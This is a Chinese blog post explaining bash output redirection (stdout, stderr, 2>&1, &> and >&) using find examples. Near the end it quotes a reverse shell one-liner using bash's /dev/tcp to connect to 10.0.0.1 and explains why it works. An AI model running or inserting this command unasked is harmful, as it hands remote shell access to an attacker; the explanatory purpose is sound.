# [linux bash的重定向](https://www.cnblogs.com/pluse/p/9234344.html)



cnblogs原创

 

下面几种bash重定向各表示什么意思？

``` bash
find / -name passwd > /dev/null
find / -name passwd > /dev/null 2>&1
find / -name passwd 2> /dev/null
find / -name passwd &> /dev/null
find / -name passwd >& /dev/null
```

上面有5种重定向，分别表示：

\1. 将find结果重定向到 /dev/null，这个find结果指的是标准输出，不含标准错误，比如以非root用户身份运行这个命令时，可能会遇到这样问题，如下：

![img](https://images2018.cnblogs.com/blog/733392/201806/733392-20180627154333286-183496882.png)

其中有的是查找到了，有的报错，对应正常查找到的是标准输出，而报错则是标准错误。标准输出与标准错误都是向屏幕输出，区别是有无缓冲，标准错误是不带缓冲的。

这个最终结果是仅输出find错误结果。

 

\2. 将find结果(标准输出)重定向到 /dev/null，同时将标准错误重定向到标准输出。在Linux中，内核默认为每个进程打开3个描述符（标准错误2、标准输出1、标准输入0）。

这个最终结果是什么都不输出。

 

\3. 将find结果(标准错误)重定向到 /dev/null，不含标准输出。

这个最终结果是只输出正常结果，不输出错误结果。

 

4/5. 这两个是相同的，只是不同写法，>&和&>完全相同，它们对位置先后无要求。将find结果(标准输出)重定向到 /dev/null，同时将标准错误重定向到标准输出。>&或者&>等同于> /dev/null 2>&1。为什么会有这种写法？大概原因是bash对csh进行兼容导致的，因为csh的标准输出和标准错误重定向是这种写法。

其实这些在bash manual手册中都是有说明的：

![img](https://images2018.cnblogs.com/blog/733392/201806/733392-20180627160657842-520471457.png) 

 

另外，网上有给出一个反弹shell，如下：

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

重定向语法上面已经解释清楚，这里无非是多了个标准输入的重定向。

使用ls命令发现/dev下面并没有这个tcp目录或者文件，这里的/dev/tcp/10.0.0.1/8000又是什么？同样在bash的manual中有说明，如下：

![img](https://images2018.cnblogs.com/blog/733392/201806/733392-20180627161053375-895690901.png)

从手册中可以看到/dev/tcp/10.0.0.1/8000是bash重定向时，一些特殊的文件而已，ls自然看不到的。

 

PS: 准备在闲暇之余用C++写个反弹shell练手的，遂有了这篇文章。但写完这篇文章之后，发现网上已经有人写过类似的（ https://www.anquanke.com/post/id/85712 ），不过没有解释/dev/tcp/host/port是怎么回事，文章就不删了，留作补充说明吧。



分类: [Unix/Linux](https://www.cnblogs.com/pluse/category/961205.html)